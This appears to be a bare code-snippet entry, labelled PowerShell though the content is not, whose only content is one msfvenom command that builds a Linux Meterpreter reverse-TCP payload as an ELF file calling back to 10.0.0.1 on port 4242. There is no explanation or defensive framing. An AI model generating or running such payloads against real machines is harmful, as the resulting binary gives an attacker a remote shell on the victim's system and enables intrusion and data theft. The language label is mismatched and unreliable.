---
id: 83f601ad-b0d4-48c1-87fc-f6827e113175
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:24.868926+00:00'
updated_at: '2023-04-10T20:25:32.391827+00:00'
---

# Code Snippet 83f601ad

**Language**: Powershell

```powershell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
```
